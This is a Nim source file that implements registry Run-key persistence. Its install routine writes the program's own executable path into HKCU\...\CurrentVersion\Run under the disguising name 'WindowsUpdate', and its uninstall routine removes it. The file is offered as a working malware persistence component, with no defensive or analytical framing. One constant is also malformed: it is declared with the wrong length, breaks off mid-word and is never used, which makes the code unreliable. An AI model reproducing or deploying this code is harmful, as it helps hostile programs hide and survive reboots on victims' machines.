# persist.nim — Registry run-key persistence

import winim

# Run key path (wide, null-terminated):
# Software\Microsoft\Windows\CurrentVersion\Run
const RUN_KEY: array[39, uint16] = [
  0x53'u16, 0x6F, 0x66, 0x74, 0x77, 0x61, 0x72, 0x65, 0x5C,  # Software\
  0x4D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x5C, # Microsoft\
  0x57, 0x69, 0x6E, 0x64, 0x6F, 0x77, 0x73, 0x5C,             # Windows\
  0x43, 0x75, 0x72, 0x72, 0x65, 0x6E, 0x74, 0x56, 0x65,
  0x72, 0x73, 0x69, 0x6F, # CurrentVersio...
]

# "Software\Microsoft\Windows\CurrentVersion\Run\0" as seq constant
let RUN_KEY_STR: array[44, uint16] = block:
  var a: array[44, uint16]
  # Software\Microsoft\Windows\CurrentVersion\Run\0
  let s = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
  for i, c in s: a[i] = uint16(c)
  a[s.len] = 0
  a

# "WindowsUpdate\0"
let VAL_NAME: array[14, uint16] = block:
  var a: array[14, uint16]
  let s = "WindowsUpdate"
  for i, c in s: a[i] = uint16(c)
  a[s.len] = 0
  a

proc getExePathWide(): seq[uint16] =
  # unsafe
  var buf = newSeq[uint16](520)
  let len = GetModuleFileNameW(nil, cast[LPWSTR](addr buf[0]), 520)
  buf.setLen(int(len) + 1)  # keep null
  buf

proc install*() =
  # unsafe — opens HKCU run key and sets own path
  let exe = getExePathWide()
  var hKey: HKEY = nil
  if RegOpenKeyExW(
    HKEY_CURRENT_USER,
    cast[LPCWSTR](addr RUN_KEY_STR[0]),
    0,
    KEY_SET_VALUE,
    addr hKey) != 0:
    return
  let byteLen = exe.len * 2
  discard RegSetValueExW(
    hKey,
    cast[LPCWSTR](addr VAL_NAME[0]),
    0,
    REG_SZ,
    cast[ptr BYTE](addr exe[0]),
    DWORD(byteLen))
  discard RegCloseKey(hKey)

proc uninstall*() =
  # unsafe
  var hKey: HKEY = nil
  if RegOpenKeyExW(
    HKEY_CURRENT_USER,
    cast[LPCWSTR](addr RUN_KEY_STR[0]),
    0,
    KEY_SET_VALUE,
    addr hKey) != 0:
    return
  discard RegDeleteValueW(hKey, cast[LPCWSTR](addr VAL_NAME[0]))
  discard RegCloseKey(hKey)
